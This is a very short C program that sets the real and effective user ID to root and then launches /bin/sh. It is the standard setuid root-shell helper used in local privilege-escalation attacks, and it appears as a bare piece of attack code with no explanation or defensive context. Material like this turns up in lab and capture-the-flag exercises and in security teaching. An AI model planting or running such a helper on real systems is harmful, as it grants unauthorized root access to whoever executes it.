#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
int main(int argc, char *argv[] )
{
    setreuid(0,0);
    execve("/bin/sh", NULL, NULL);
    
}
